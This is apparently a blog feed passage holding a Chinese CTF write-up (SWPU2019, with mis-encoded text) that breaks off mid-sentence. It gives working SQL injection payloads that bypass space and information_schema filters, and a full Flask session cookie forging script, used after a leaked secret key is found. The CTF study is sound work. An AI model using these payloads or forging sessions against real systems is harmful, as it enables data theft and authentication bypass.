52ca9af98baaf1edf64326499fa5ad2aed347674854bbf8bb23ea70a1f511ed1f79d6fe8004b129439a56aea966d5e0496dccbe816bdb1eefb061af8af62e306f330bdc27445cb0876ea8e97ff62da359be96743f77c50e5cb7bd0402e4b9e8ad071c555ad140b5f6b23b4d95d74d0c74de1d050111f6d12143e758a549b98e6b9cac103dfc4f6510797bafb7aa4dc11f559eae75125b37e571e094ebf324afb0630800fdb1af93068f37f8cd977757ff9199e475382f032033b7d035520adc3752659b7c65b63f8570eeaa3c8ed51b35e709b464476fd15d8419660a07b9f2e32e438153cb2f96edeebc0eeb44eeb135adba253818f000f97cf60253a198c5d7c1201edaf548591d2e823b5bbbcdf2bded62bc2dcb5ab6c87a530350ca20d74aa6232f543faf6f7af5baa896a5168304237d02974fa28e539e4fff254d695a1249d46036d78d4d225bdac8f4b1466b64e81fc37eeabc43f02fd80fc00d13cb1f95a8d882cef4613c745a1fb07166dfeaa1b7d1deba7d9637be329c14cab49fdaa21e0f81677bff0fef52afa3c0821a82c157818422c9efa5613de9db91d4b5f3df6255d1fbabffd9fa49619e950a800d7865e99283f3c4b0d08436cabe3e6150f40bb971115bf4b44cb73fa4d936383350542681e0a91a8780a79277dbe4fa95ee449e6e5239ef01c0da1d67eae32cf386d365cb72e673f501071eb9025a95201c34239ff28a9862583b549441bb8085b3d943eef183d337ad6133116d2cb248d9f1c5de148fac081e31a7c76610b27c98d88338bd45695d5cb74a47487ed8c513c73f0d3e3fde019d1eef42cbe2068498d67d15c5412c4ef9e95c88f4c265f525574a4aea595d91acd9f52b20e30a28baced7bf5322fd82d20c918028e3f9717e9b5d27736bfc95d1ec0946d748045000dad6ce808803756ca2069ff5a451e75a0991d62208105060bc09868dca927474fc828be9bd424b0ac5ba47b754513d8015b5d10e632b5a533d539b4747ed84ffb16e9c5af8e5807c51c8461d00f126d5ef4033fec5858874e52c83775e99a87e87472a3b7a83d3614a4fa0618fe08d73ea3946b63344e92bdab527bdbd24cb67d4e30b600f5859c1f588d780d16ab131b504a01aa4e742b68fa682caf113513666d963582b680e4b3aa2d65371c8e3d554fc8f7ec491d7fbce1ec319446b463e297405fc553305fe5621a111743fa9d6b1c6b15e1d7a302b39b597bd2afc9e80ff836e3ccc3b109a28db558f8b9c703fa1c514dd80650b9b21083051ddd8d00f66b2cebfabbf4adf16d37ea589beeda5aa3d1b67b2885fcb9b96813a6089b0f807a4ab8853342384291154857398157df45fa0b47d3ad78e9b4db9473bef122ccb683c6e0b4bc2d01a64ed6466b7c3c4617329a9014368105e0df2cc3da87d0767c9c91753262c47c8ca5f387e8584e5b5ac3cc1e9d2305aaffa5b591aef3209c8a4e17d757251899b9c66e2ff435a3996968bb80ca3368b5f409f6ea3814595ec719d6cb33765d8fd7f601e10ae5d90129b174776003faa622c7ee573adeabee65246295899976c177acfcc53d8a949de4836c280fbc5097ac735782bdbb52187d15d5f7e6fab7a8aa3fded78a1b347b8fa6d809291315ef11a215983b3a45ccff4756da40ca8e0da903c85c7beb75791b3b89a49829628ea722b119cb65358faf3a96a45783808c4699ac2df2aa44a1c52876218ee0ca43f130ef634bb83a22b3eb487a20ec37b7417bd9ee4eb4ec0231d727ac24d6bb6f5df176650122c6c012261d2b7bff2fca626ebab5fe634aae374d3503b00bab34d2b6d0309acf49b6a18d8365fe2174375c10b9b027b0636289035618caf7227ba3ebb9b26dd922355d725084915ef5d878555fd4a70743a0d6430c882e1c60f8f47de05c72b51949c596016601f4c54609a759db2148243c2f1bd5b26a68b4745ee8f2b814e286339599956c5eba1ddc42d16e8d5048cc1335511a836e459e2003a8655815cd87c46580df61aa32b54a7948f494000fa12eb919edba7f98fa308352f1d2f8ef55640fd4023c8ecc663d5fe74b80726ee8e4a7a59d0491f632fbb452c601008e553a16a576b215c9cb0c43c3f576561422e1f94a734ea8783ec4a587da95a70b9400e813622d7236fb600b49f4cd3054ecab7303b1b3e51c462f62a14e0e9ddebf67d5db8d84997a6118ab2461ebbe2d4e2eec998b5b6238f1238f9c59a18a51affcd887467839d8abd971b413117fe5c631c1a321ada8b36f7936c3a06dfa69ea3022c85469aa1e2757d3722b7389be19b0602af4beae57fa4687ddcad11306c373d8c8e4f1d70f1664ac7fa389bd859c2110e5594f72f1cf28acfb784421dbd13df41919fd2b45f0cb3001a71d774a6f9f9e1a30c3f8243f8f3c76210d117267a14dd2fc851f816f5dae44af6c96b7a2aeb3697d796f04fe4e93506394c9bc4b6070eee487c564ca438d0d26ccfa28c001b6b239b0e3ff006ac11bad484f435b19f66395ec872388467dfb0b57a7d7fc4a39e69535e17895af065bff00a7d6de0384977bcf170d13f3b6225874f2f1c587978906991a345ff8dce935e17fb10babbd217a3b61b5c4ee673975f17ada362a8d46e91097a722390afcb6d02692be82cc1d34b04f64996df0855e65929e63c960b289ea4977e3fd1a5d0b014c384ac741200d41b5254643c902e511eb4b48ba9b0562339a8ba39ebdb14e0989265b53bd68436ff508bcbfa1b94402fc6b66048a6198c5dafc8149fe316d89b2a7465e7c2b70f1a5a58538bfd492b99613cecc4644c9be3e181b3b3167e7d8be0fdf67672143bc7814a8f095a878d818c8fe38d880a43463ceb2ca1a26c30c67e41a80ee0e557050a8d5fc60dfaf1de42b61fb45374624781a4b0512ff98c0d997311f878ed29f698ed8e7a0dbe345ab206e00b817e3eff2f1341af74d9d9ad3cafd4398a0e3fae6eb3a554054da8b68f41304124d8aadab6abcfd383fa6ad4a4d3a84f891a4553eee431a71c7d2be658ff057537b5accd8bf0d6ef51099988a392cc09bc152d9f86c1b039e88180b9b26e56530b1a3a0197a28ee8a692d22839b1363cdda399a8fee0eb9dbb560cfdffb17a9f16297bb946cd0387be464acbb959560d5212fb161c52c5478814b2abf2c26483928e24d95d72b3bcd0ecb524dd718aa918240859b211c9c85140d88d6358ff6d94fa23a5092eac9d262009170e07abb77aa5f1deb62b4d93918264de8cd089ffb80c792464e72874237d00bc863eaa3d7668c112d1c9b776c409b57415118d54c14ccd5db307ce8b31a7642e5686e58ffc642dedbc591eb9a83260da341b0870262936d4f504baf0051f5088a1ec5d4bdbc115d24c0efedef6f94d33df40720a7f056cf9fc0195be2c1fa42bc159da034682c6d5cbffbc6b768c174733f41ed447dd03979ff357cb23b08d96a819a9d939055481695d2d601f0c40d69ee8e529f797facf68e25e54c6c7a7d3d4f8e709122106c6bcc2531d5d42998c9b1fa495059724534421deaff93f2986ace02a2ae1a1067f95817d7316bc68eac966a1aeb8cf8463428d3e66605363a80b458b75e71a4f95095a10346669a6d741e13e695b002679aaca28345f915bf70672aaf7b8436fbcf8ee603a7ce4213e7be8cc5a40c7b1852f2f5283089003df536344f553c1fc361bf66d02d1b6a04d64e552d083368e3849e98a563602be5b11980e012393b5e54a3cef96674cabf3332ade3aae445beb434f0bcae6113f08e428b150a1aa98e99560c56b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      å’¦ï¼Œè¿™æ˜¯ä¸€ç¯‡åŠ å¯†æ–‡ç« ï¼Œå¥½åƒéœ€è¦è¾“å…¥å¯†ç æ‰èƒ½æŸ¥çœ‹å‘¢ï¼
    
    </summary>
    
    
    
      <category term="ç½‘ç»œé…ç½®" scheme="http://ggb0n.cool/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019å¤ç°</title>
    <link href="http://ggb0n.cool/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-03-20T11:55:48.000Z</published>
    <updated>2020-05-13T03:09:04.071Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ç›´æƒ³ç€å¤ç°æ¥ç€ï¼Œè®°äº‹æœ¬é‡Œä¹Ÿè®°å½•äº†å‡ ä¸ªæœˆäº†â€¦ğŸ¤£<a id="more"></a></p><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>äºŒæ¬¡æ³¨å…¥ã€æ— åˆ—åæŸ¥è¯¢ï¼Œå¯¹<code>MariaDB</code>è¿‡æ»¤<code>information_schema</code>çš„æ³¨å…¥ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®æ³¨å†Œå¹¶ç™»é™†ä¹‹åï¼Œå‘ç°å¯ä»¥å‘å¸ƒå¹¿å‘Šï¼Œå¹¶ä¸”åœ¨å¹¿å‘Šåçš„åœ°æ–¹å­˜åœ¨<code>äºŒæ¬¡æ³¨å…¥</code>(æäº¤å†…å®¹çš„æ—¶å€™æ³¨å…¥ä¸æ‰§è¡Œï¼ŒæŸ¥è¯¢çš„æ—¶å€™æ‰æ‰§è¡Œ)ï¼Œç»è¿‡æµ‹è¯•å‘ç°<code>or</code>è¢«banäº†ï¼ŒåŒæ—¶ç©ºæ ¼ä¹Ÿä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå› æ­¤éœ€è¦åˆ©ç”¨<code>/**/</code>ç»•è¿‡å¯¹ç©ºæ ¼çš„è¿‡æ»¤ã€‚<br>æ—¢ç„¶<code>or</code>è¢«banæ‰äº†ï¼Œé‚£ä¹ˆä¾¿ä¸èƒ½å†åˆ©ç”¨<code>order by</code>æ³¨å…¥æŸ¥åˆ—æ•°äº†ï¼Œæ­¤æ—¶åªèƒ½ç›´æ¥åˆ©ç”¨<code>union select</code>è¿›è¡Œåˆ—åçš„éå†äº†ã€‚<br>åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­å‘ç°äº†åå°æ•°æ®åº“æ˜¯<code>MariaDB</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web50.png" alt=""><br>åŒæ—¶<code>or</code>è¢«banæ‰ï¼Œå› æ­¤<code>information_schema</code>ä¸èƒ½ç”¨ï¼Œæ­¤æ—¶æƒ³åˆ°åˆ©ç”¨<code>mysql.innodb_table_stats</code>æ¥æŸ¥è¡¨å(è¿™ä¸ªåœ°æ–¹å¯ä»¥å‚è€ƒï¼š<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/)ï¼Œä½†æ˜¯æ— æ³•è·å–åˆ—åï¼Œå› æ­¤æœ€ç»ˆè·å–flagéœ€è¦å€ŸåŠ©`æ— åˆ—åæ³¨å…¥`äº†(å‚è€ƒï¼šhttps://blog.csdn.net/chasingin/article/details/103476001)ã€‚">https://mariadb.com/kb/en/mysqlinnodb_table_stats/)ï¼Œä½†æ˜¯æ— æ³•è·å–åˆ—åï¼Œå› æ­¤æœ€ç»ˆè·å–flagéœ€è¦å€ŸåŠ©`æ— åˆ—åæ³¨å…¥`äº†(å‚è€ƒï¼šhttps://blog.csdn.net/chasingin/article/details/103476001)ã€‚</a></p><p>ç°åœ¨æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œé¦–å…ˆåˆ©ç”¨<code>union select</code>æµ‹è¯•å‡ºåˆ—æ•°ï¼Œç„¶ååˆ©ç”¨<code>mysql.innodb_table_stats</code>æŸ¥å‡ºè¡¨åï¼Œæœ€åæ— åˆ—åæ³¨å…¥æ‹¿åˆ°flagã€‚</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>é¦–å…ˆæŸ¥åˆ—æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>mysql.innodb_table_stats</code>æŸ¥è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web48.png" alt=""><br>å°†åˆ—è½¬æ¢ä¸ºè¡Œï¼Œè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web49.png" alt=""></p><p>å¦å¤–è¡¥å……ä¸€ç‚¹ï¼Œå¦‚æœåå°æ•°æ®åº“æ˜¯<code>mysql</code>ï¼Œä½†æ˜¯<code>information_schema</code>è¢«banæ‰ä¹‹åï¼Œå¦‚æœ<code>mysql</code>æ²¡æœ‰å¼€å¯<code>innodbå­˜å‚¨å¼•æ“</code>åˆ™å¯åˆ©ç”¨<code>sysæ•°æ®åº“``schema_auto_increment_columns</code>å’Œ<code>schema_table_statistics_with_buffer</code>æ¥ç»•è¿‡ï¼Œä½†æ˜¯æœ¬é¢˜åå°æ•°æ®åº“æ˜¯<code>MariaDB</code>ï¼Œä¸Šè¿°æ–¹æ³•ä¾¿ä¸å¯ç”¨ï¼Œä¸è¿‡ç»™ä¸€ä¸‹æˆ‘åšé¢˜çš„æ—¶å€™æµ‹è¯•çš„payloadï¼Œé‡åˆ°ç±»ä¼¼é¢˜ç›®å¯èƒ½ç”¨å¾—ä¸Šï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;sys.schema_auto_increment_column&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;sys.schema_table_statistics_with_buffer&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p>ç„¶åå†åˆ©ç”¨<code>join</code>æˆ–<code>join...using</code>è¿›è¡Œæ— åˆ—åæŸ¥è¯¢å³å¯ã€‚<br>ç»•è¿‡<code>information_schema</code>å¯ä»¥å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>è€ƒå¯ŸJWTä¼ªé€ æ”»å‡»ï¼Œè½¯é“¾æ¥ä»»æ„æ–‡ä»¶è¯»å–</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œä»»æ„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œå‘ç°å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼š<br><img src="http://ggb0n.cool/images/swpuctf02.png" alt=""></p><p>ç›´æ¥ç‚¹æŒ‰é’®åé¦ˆæ²¡æœ‰æƒé™â€¦</p><p>çœ‹æºç å‘ç°äº†<code>404 not found</code>çš„æç¤ºï¼Œç½‘ä¸Šçš„wpæ˜¯è¿™ä¹ˆè¯´çš„ï¼š</p><blockquote><p>åœ¨<code>flask</code>ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>app.errorhandler()</code>è£…é¥°å™¨æ¥æ³¨å†Œé”™è¯¯å¤„ç†å‡½æ•°ï¼Œå‚æ•°æ˜¯<code>HTTP é”™è¯¯çŠ¶æ€ç </code>æˆ–è€…<code>ç‰¹å®šçš„å¼‚å¸¸ç±»</code>ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°åœ¨<code>404</code>é”™è¯¯ä¸­ä¼šæœ‰ä¸œè¥¿å­˜åœ¨ã€‚</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬æ„é€ ä¸€ä¸ªä»»æ„çš„æ–‡ä»¶åˆ°urlä¸­å»è®¿é—®ï¼Œçœ‹ä¸€ä¸‹å›æ˜¾ï¼š<br><img src="http://ggb0n.cool/images/swpuctf03.png" alt=""></p><p>å‘ç°å“åº”å¤´ä¸­å­˜åœ¨<br><code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>è§£ç å¾—åˆ°ï¼š<br><code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p><p>ç»“åˆå‰é¢çš„æƒé™è¦æ±‚ï¼ŒçŒœæµ‹æ˜¯JWTä¼ªé€ äº†ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ä¸­çš„JWTç›´æ¥å»è§£base64çš„ç»“æœæ˜¯è¿™æ ·çš„ï¼š<br><code>{&quot;id&quot;:{&quot; b&quot;:&quot;MTAw&quot;},&quot;is_login&quot;:true,&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;123&quot;}</code></p><p>æœŸåˆä¸€ç›´ä»¥è¿™ç§ç»“æ„å»ä¼ªé€ ï¼ŒæœåŠ¡å™¨å°±è€æ˜¯åé¦ˆ<code>500 error</code>ï¼Œåæ¥å‚è€ƒç½‘ä¸Šä¸€ç¯‡wpä¸­è®²çš„è§£JWTç”¨çš„æ˜¯å¦‚ä¸‹çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""" Flask Session Cookie Decoder/Encoder """</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Must be using at least Python 3'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(ABC)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">                epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(help=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, help=<span class="string">'encode'</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie structure'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, help=<span class="string">'decode'</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie value'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure><p>ç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">è§£å¯†:python flask_session_manager.py decode -c -s <span class="comment"># -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEY</span></span><br><span class="line">åŠ å¯†:python flask_session_manager.py encode -s -t <span class="comment"># -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°æ˜¯sessionçš„å‚ç…§æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯sessionè§£å¯†åçš„æ 